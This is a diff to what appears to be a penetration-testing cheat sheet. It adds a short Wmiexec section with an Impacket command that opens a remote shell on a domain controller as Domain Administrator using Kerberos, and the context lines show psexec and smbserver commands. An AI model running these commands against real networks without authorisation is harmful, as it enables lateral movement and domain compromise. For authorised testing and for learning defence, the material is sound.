@@ -28,6 +28,16 @@ sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123
 ./psexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
 ```
 
+## Wmiexec
+
+{% hint style="warning" %}
+As opposite to psexec which provides NT LOCAL/System shell, wmiexec allows to keep the requested user context, i.e. Domain\Administrator will get an Domain\Administrator shell.
+{% endhint %}
+
+```csharp
+./wmiexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
+```
+
 ## Golden Ticket
 
 ### Request a TGT
